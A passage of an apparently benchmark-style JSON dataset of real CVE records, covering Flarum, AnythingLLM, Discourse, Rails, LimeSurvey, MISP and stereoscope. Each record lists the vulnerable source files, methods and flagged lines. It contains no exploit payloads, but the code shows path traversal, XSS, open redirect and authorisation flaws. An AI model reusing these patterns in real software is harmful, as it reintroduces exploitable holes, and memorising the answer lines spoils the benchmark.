        "public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "        UrlGenerator $url"
        },
        {
          "line_no": 85,
          "content": "        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());"
        },
        {
          "line_no": 87,
          "content": "        // If there is no user logged in, return to the index."
        },
        {
          "line_no": 89,
          "content": "            return new RedirectResponse($url);"
        },
        {
          "line_no": 97,
          "content": "            $return = Arr::get($request->getQueryParams(), 'return');"
        },
        {
          "line_no": 100,
          "content": "                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));"
        },
        {
          "line_no": 106,
          "content": "        $response = new RedirectResponse($url);"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 661,
    "cve": "CVE-2024-3028",
    "description": "mintplex-labs/anything-llm is vulnerable to improper input validation, allowing attackers to read and delete arbitrary files on the server. By manipulating the 'logo_filename' parameter in the 'system-preferences' API endpoint, an attacker can construct requests to read sensitive files or the application's '.env' file, and even delete files by setting the 'logo_filename' to the path of the target file and invoking the 'remove-logo' API endpoint. This vulnerability is due to the lack of proper sanitization of user-supplied input.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/files/logo.js",
          "content": "const path = require(\"path\");\nconst fs = require(\"fs\");\nconst { getType } = require(\"mime\");\nconst { v4 } = require(\"uuid\");\nconst { SystemSettings } = require(\"../../models/systemSettings\");\nconst LOGO_FILENAME = \"anything-llm.png\";\n\nfunction validFilename(newFilename = \"\") {\n  return ![LOGO_FILENAME].includes(newFilename);\n}\n\nfunction getDefaultFilename() {\n  return LOGO_FILENAME;\n}\n\nasync function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}\n\nfunction fetchLogo(logoPath) {\n  if (!fs.existsSync(logoPath)) {\n    return {\n      found: false,\n      buffer: null,\n      size: 0,\n      mime: \"none/none\",\n    };\n  }\n\n  const mime = getType(logoPath);\n  const buffer = fs.readFileSync(logoPath);\n  return {\n    found: true,\n    buffer,\n    size: buffer.length,\n    mime,\n  };\n}\n\nasync function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}\n\nasync function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}\n\nmodule.exports = {\n  fetchLogo,\n  renameLogoFile,\n  removeCustomLogo,\n  validFilename,\n  getDefaultFilename,\n  determineLogoFilepath,\n  LOGO_FILENAME,\n};\n"
        }
      ],
      "method_level": [
        "async function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}",
        "async function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}",
        "async function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    customLogoPath = path.join(basePath, currentLogoFilename);"
        },
        {
          "line_no": 55,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)"
        },
        {
          "line_no": 56,
          "content": "    : path.join(__dirname, `../../storage/assets/${originalFilename}`);"
        },
        {
          "line_no": 58,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)"
        },
        {
          "line_no": 59,
          "content": "    : path.join(__dirname, `../../storage/assets/${newFilename}`);"
        },
        {
          "line_no": 68,
          "content": "    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)"
        },
        {
          "line_no": 69,
          "content": "    : path.join(__dirname, `../../storage/assets/${logoFilename}`);"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.0
  },
  {
    "id": 1017,
    "cve": "CVE-2024-37299",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, crafting requests to submit very long tag group names can reduce the availability of a Discourse instance. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 68,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 69,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.9,
    "cvss_version": 3.1
  },
  {
    "id": 377,
    "cve": "CVE-2024-26143",
    "description": "Rails is a web-application framework. There is a possible XSS vulnerability when using the translation helpers in Action Controller. Applications using translation methods like translate, or t on a controller, with a key ending in \"_html\", a :default key which contains untrusted user input, and the resulting string is used in a view, may be susceptible to an XSS vulnerability. The vulnerability is fixed in 7.1.3.1 and 7.0.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/abstract_controller/translation.rb",
          "content": "# frozen_string_literal: true\n\nrequire \"active_support/html_safe_translation\"\n\nmodule AbstractController\n  module Translation\n    mattr_accessor :raise_on_missing_translations, default: false\n\n    # Delegates to <tt>I18n.translate</tt>.\n    #\n    # When the given key starts with a period, it will be scoped by the current\n    # controller and action. So if you call <tt>translate(\".foo\")</tt> from\n    # <tt>PeopleController#index</tt>, it will convert the call to\n    # <tt>I18n.translate(\"people.index.foo\")</tt>. This makes it less repetitive\n    # to translate many keys within the same controller / action and gives you a\n    # simple framework for scoping them consistently.\n    def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      i18n_raise = options.fetch(:raise, self.raise_on_missing_translations)\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)\n    end\n    alias :t :translate\n\n    # Delegates to <tt>I18n.localize</tt>.\n    def localize(object, **options)\n      I18n.localize(object, **options)\n    end\n    alias :l :localize\n  end\nend\n"
        }
      ],
      "method_level": [
        "def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      i18n_raise = options.fetch(:raise, self.raise_on_missing_translations)\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 28,
          "content": "      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1220,
    "cve": "CVE-2024-28710",
    "description": "Cross Site Scripting vulnerability in LimeSurvey before 6.5.0+240319 allows a remote attacker to execute arbitrary code via a lack of input validation and output encoding in the Alert Widget's message component.",
    "vulnerability": {
      "file_level": [
        {
          "name": "application/controllers/AjaxAlertController.php",
          "content": "<?php\n\n/**\n * Controller for rendering AlertWidget via Ajax call\n */\nclass AjaxAlertController extends LSBaseController\n{\n    /**\n     * Spits out html from AlertWidget\n     *\n     * @return string\n     */\n    public function actionGetAlertWidget()\n    {\n        $widgetOptions = $this->translateOptionsForWidget();\n\n        return json_encode(App()->getController()->widget('ext.AlertWidget.AlertWidget', $widgetOptions));\n    }\n\n    /**\n     * Translates given json options to php array, but only the known options for the widget\n     * @return array\n     */\n    private function translateOptionsForWidget()\n    {\n        $request = Yii::app()->request;\n        $customOptions = $request->getPost('customOptions', []);\n\n        $translatedOptions = [];\n        $translatedOptions['text'] = $request->getPost('message', 'message');\n        $translatedOptions['type'] = $request->getPost('alertType', 'success');\n        $knownOptions = ['tag', 'isFilled', 'showIcon', 'showCloseButton', 'timeout'];\n        foreach ($knownOptions as $knownOption) {\n            if (array_key_exists($knownOption, $customOptions)) {\n                if ($knownOption == 'tag') {\n                    $translatedOptions[$knownOption] = $customOptions[$knownOption];\n                } elseif ($knownOption == 'timeout') {\n                    $translatedOptions[$knownOption] = (int) $customOptions[$knownOption];\n                } else {\n                    $translatedOptions[$knownOption] = $customOptions[$knownOption] !== 'false';\n                }\n            }\n        }\n        if (array_key_exists('htmlOptions', $customOptions)) {\n            $translatedOptions['htmlOptions'] = json_decode_ls($customOptions['htmlOptions']);\n        }\n\n        return $translatedOptions;\n    }\n}\n"
        }
      ],
      "method_level": [
        "private function translateOptionsForWidget()\n    {\n        $request = Yii::app()->request;\n        $customOptions = $request->getPost('customOptions', []);\n\n        $translatedOptions = [];\n        $translatedOptions['text'] = $request->getPost('message', 'message');\n        $translatedOptions['type'] = $request->getPost('alertType', 'success');\n        $knownOptions = ['tag', 'isFilled', 'showIcon', 'showCloseButton', 'timeout'];\n        foreach ($knownOptions as $knownOption) {\n            if (array_key_exists($knownOption, $customOptions)) {\n                if ($knownOption == 'tag') {\n                    $translatedOptions[$knownOption] = $customOptions[$knownOption];\n                } elseif ($knownOption == 'timeout') {\n                    $translatedOptions[$knownOption] = (int) $customOptions[$knownOption];\n                } else {\n                    $translatedOptions[$knownOption] = $customOptions[$knownOption] !== 'false';\n                }\n            }\n        }\n        if (array_key_exists('htmlOptions', $customOptions)) {\n            $translatedOptions['htmlOptions'] = json_decode_ls($customOptions['htmlOptions']);\n        }\n\n        return $translatedOptions;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 30,
          "content": "        $translatedOptions['text'] = $request->getPost('message', 'message');"
        },
        {
          "line_no": 31,
          "content": "        $translatedOptions['type'] = $request->getPost('alertType', 'success');"
        },
        {
          "line_no": 36,
          "content": "                    $translatedOptions[$knownOption] = $customOptions[$knownOption];"
        },
        {
          "line_no": 38,
          "content": "                    $translatedOptions[$knownOption] = (int) $customOptions[$knownOption];"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1129,
    "cve": "CVE-2024-45509",
    "description": "In MISP through 2.4.196, app/Controller/BookmarksController.php does not properly restrict access to bookmarks data in the case where the user is not an org admin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Controller/BookmarksController.php",
          "content": "<?php\nApp::uses('AppController', 'Controller');\n\nclass BookmarksController extends AppController\n{\n    public $components = ['RequestHandler'];\n\n    public function beforeFilter()\n    {\n        parent::beforeFilter();\n        $this->Bookmark->current_user = $this->Auth->user();\n    }\n\n    public function index()\n    {\n        $passedParams = $this->IndexFilter->harvestParameters([\n            'scope',\n        ]);\n        $scope = $passedParams['scope'] ?? 'all';\n        $conditions = [];\n        if ($scope == 'mine') {\n            $conditions = [\n                'Bookmark.user_id' => $this->Auth->user()['id'],\n            ];\n        } else if ($scope == 'org') {\n            $conditions = [\n                'OR' => [\n                    'Bookmark.user_id' => $this->Auth->user()['id'],\n                    'AND' => [\n                        'Bookmark.org_id' => $this->Auth->user()['Organisation']['id'],\n                        'Bookmark.exposed_to_org' => true,\n                    ],\n                ],\n            ];\n        } else {\n            if (empty($this->Auth->user()['Role']['perm_site_admin'])) {\n                $conditions = [\n                    'OR' => [\n                        'Bookmark.user_id' => $this->Auth->user()['id'],\n                        'AND' => [\n                            'Bookmark.org_id' => $this->Auth->user()['Organisation']['id'],\n                            'Bookmark.exposed_to_org' => true,\n                        ],\n                    ],\n                ];\n            }\n        }\n        $params = [\n            'filters' => ['name', 'url', ],\n            'quickFilters' => ['Bookmark.name', 'Bookmark.url', ],\n            'conditions' => $conditions,\n        ];\n        $this->CRUD->index($params);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'index']);\n        $this->set('scope', $scope);\n    }\n\n    public function add()\n    {\n        $currentUser = $this->Auth->user();\n        $params = [\n            'beforeSave' => function($data) use ($currentUser) {\n                if (!empty($currentUser['Role']['perm_admin'])) {\n                    $data['Bookmark']['exposed_to_org'] = false;\n                }\n                return $data;\n            }\n        ];\n        $this->CRUD->add($params);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'add']);\n    }\n\n    public function edit($id)\n    {\n        if (!$this->Bookmark->mayModify($this->Auth->user(), intval($id))) {\n            throw new MethodNotAllowedException(__('Invalid Bookmark or insuficient privileges'));\n        }\n        $params = [\n        ];\n        $this->CRUD->edit($id, $params);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'edit']);\n        $this->set('id', $id);\n        $this->render('add');\n    }\n\n    public function delete($id)\n    {\n        if (!$this->Bookmark->mayModify($this->Auth->user(), intval($id))) {\n            throw new MethodNotAllowedException(__('Invalid Bookmark or insuficient privileges'));\n        }\n        $this->CRUD->delete($id);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'delete']);\n    }\n\n    public function view($id)\n    {\n        if (!$this->Bookmark->mayModify($this->Auth->user(), intval($id))) {\n            throw new MethodNotAllowedException(__('Invalid Bookmark or insuficient privileges'));\n        }\n        $params = [\n            'contain' => ['User', 'Organisation'],\n        ];\n        $this->CRUD->view($id, $params);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('id', $id);\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'view']);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function view($id)\n    {\n        if (!$this->Bookmark->mayModify($this->Auth->user(), intval($id))) {\n            throw new MethodNotAllowedException(__('Invalid Bookmark or insuficient privileges'));\n        }\n        $params = [\n            'contain' => ['User', 'Organisation'],\n        ];\n        $this->CRUD->view($id, $params);\n        if ($this->restResponsePayload) {\n            return $this->restResponsePayload;\n        }\n        $this->set('id', $id);\n        $this->set('menuData', ['menuList' => 'bookmarks', 'menuItem' => 'view']);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 113,
          "content": "            'contain' => ['User', 'Organisation'],"
        }
      ]
    },
    "cwe": [
      "CWE-863",
      "CWE-284"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 186,
    "cve": "CVE-2024-24579",
    "description": "stereoscope is a go library for processing container images and simulating a squash filesystem.  Prior to version 0.0.1, it is possible to craft an OCI tar archive that, when stereoscope attempts to unarchive the contents, will result in writing to paths outside of the unarchive temporary directory. Specifically, use of `github.com/anchore/stereoscope/pkg/file.UntarToDirectory()` function, the  `github.com/anchore/stereoscope/pkg/image/oci.TarballImageProvider` struct, or the higher level `github.com/anchore/stereoscope/pkg/image.Image.Read()` function express this vulnerability. As a workaround, if you are using the OCI archive as input into stereoscope then you can switch to using an OCI layout by unarchiving the tar archive and provide the unarchived directory to stereoscope.",
    "vulnerability": {
      "file_level": [
        {
          "name": "pkg/file/tarutil.go",
          "content": "package file\n\nimport (\n\t\"archive/tar\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"github.com/pkg/errors\"\n\n\t\"github.com/anchore/stereoscope/internal/log\"\n)\n\nconst perFileReadLimit = 2 * GB\n\nvar ErrTarStopIteration = fmt.Errorf(\"halt iterating tar\")\n\n// tarFile is a ReadCloser of a tar file on disk.\ntype tarFile struct {\n\tio.Reader\n\tio.Closer\n}\n\n// TarFileEntry represents the header, contents, and list position of an entry within a tar file.\ntype TarFileEntry struct {\n\tSequence int64\n\tHeader   tar.Header\n\tReader   io.Reader\n}\n\n// TarFileVisitor is a visitor function meant to be used in conjunction with the IterateTar.\ntype TarFileVisitor func(TarFileEntry) error\n\n// ErrFileNotFound returned from ReaderFromTar if a file is not found in the given archive.\ntype ErrFileNotFound struct {\n\tPath string\n}\n\nfunc (e *ErrFileNotFound) Error() string {\n\treturn fmt.Sprintf(\"file not found (path=%s)\", e.Path)\n}\n\n// IterateTar is a function that reads across a tar and invokes a visitor function for each entry discovered. The iterator\n// stops when there are no more entries to read, if there is an error in the underlying reader or visitor function,\n// or if the visitor function returns a ErrTarStopIteration sentinel error.\nfunc IterateTar(reader io.Reader, visitor TarFileVisitor) error {\n\ttarReader := tar.NewReader(reader)\n\tvar sequence int64 = -1\n\tfor {\n\t\tsequence++\n\n\t\thdr, err := tarReader.Next()\n\t\tif errors.Is(err, io.EOF) {\n\t\t\tbreak\n\t\t}\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tif hdr == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tif err := visitor(TarFileEntry{\n\t\t\tSequence: sequence,\n\t\t\tHeader:   *hdr,\n\t\t\tReader:   tarReader,\n\t\t}); err != nil {\n\t\t\tif errors.Is(err, ErrTarStopIteration) {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn fmt.Errorf(\"failed to visit tar entry=%q : %w\", hdr.Name, err)\n\t\t}\n\t}\n\treturn nil\n}\n\n// ReaderFromTar returns a io.ReadCloser for the Path within a tar file.\nfunc ReaderFromTar(reader io.ReadCloser, tarPath string) (io.ReadCloser, error) {\n\tvar result io.ReadCloser\n\n\tvisitor := func(entry TarFileEntry) error {\n\t\tif entry.Header.Name == tarPath {\n\t\t\tresult = &tarFile{\n\t\t\t\tReader: entry.Reader,\n\t\t\t\tCloser: reader,\n\t\t\t}\n\t\t\treturn ErrTarStopIteration\n\t\t}\n\t\treturn nil\n\t}\n\tif err := IterateTar(reader, visitor); err != nil {\n\t\treturn nil, err\n\t}\n\n\tif result == nil {\n\t\treturn nil, &ErrFileNotFound{tarPath}\n\t}\n\n\treturn result, nil\n}\n\n// MetadataFromTar returns the tar metadata from the header info.\nfunc MetadataFromTar(reader io.ReadCloser, tarPath string) (Metadata, error) {\n\tvar metadata *Metadata\n\tvisitor := func(entry TarFileEntry) error {\n\t\tif entry.Header.Name == tarPath {\n\t\t\tvar content io.Reader\n\t\t\tif entry.Header.Size > 0 {\n\t\t\t\tcontent = reader\n\t\t\t}\n\t\t\tm := NewMetadata(entry.Header, content)\n\t\t\tmetadata = &m\n\t\t\treturn ErrTarStopIteration\n\t\t}\n\t\treturn nil\n\t}\n\tif err := IterateTar(reader, visitor); err != nil {\n\t\treturn Metadata{}, err\n\t}\n\tif metadata == nil {\n\t\treturn Metadata{}, &ErrFileNotFound{tarPath}\n\t}\n\treturn *metadata, nil\n}\n\n// UntarToDirectory writes the contents of the given tar reader to the given destination\nfunc UntarToDirectory(reader io.Reader, dst string) error {\n\tvisitor := func(entry TarFileEntry) error {\n\t\ttarget := filepath.Join(dst, entry.Header.Name)\n\n\t\tswitch entry.Header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\tif _, err := os.Stat(target); err != nil {\n\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t}\n\n\t\tcase tar.TypeReg:\n\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\n\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n\t\t\t}\n\t\t\tif err != nil {\n\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n\t\t\t}\n\n\t\t\tif err = f.Close(); err != nil {\n\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\t}\n\n\treturn IterateTar(reader, visitor)\n}\n"
        }
      ],
      "method_level": [
        "func UntarToDirectory(reader io.Reader, dst string) error {\n\tvisitor := func(entry TarFileEntry) error {\n\t\ttarget := filepath.Join(dst, entry.Header.Name)\n\n\t\tswitch entry.Header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\tif _, err := os.Stat(target); err != nil {\n\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t}\n\n\t\tcase tar.TypeReg:\n\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\n\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n\t\t\t}\n\t\t\tif err != nil {\n\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n\t\t\t}\n\n\t\t\tif err = f.Close(); err != nil {\n\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\t}\n\n\treturn IterateTar(reader, visitor)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 129,
          "content": "\tvisitor := func(entry TarFileEntry) error {"
        },
        {
          "line_no": 130,
          "content": "\t\ttarget := filepath.Join(dst, entry.Header.Name)"
        },
        {
          "line_no": 132,
          "content": "\t\tswitch entry.Header.Typeflag {"
        },
        {
          "line_no": 133,
          "content": "\t\tcase tar.TypeDir:"
        },
        {
          "line_no": 134,
          "content": "\t\t\tif _, err := os.Stat(target); err != nil {"
        },
        {
          "line_no": 135,
          "content": "\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {"
        },
        {
          "line_no": 136,
          "content": "\t\t\t\t\treturn err"
        },
        {
          "line_no": 137,
          "content": "\t\t\t\t}"
        },
        {
          "line_no": 138,
          "content": "\t\t\t}"
        },
        {
          "line_no": 140,
          "content": "\t\tcase tar.TypeReg:"
        },
        {
          "line_no": 141,
          "content": "\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))"
        },
        {
          "line_no": 142,
          "content": "\t\t\tif err != nil {"
        },
        {
          "line_no": 146,
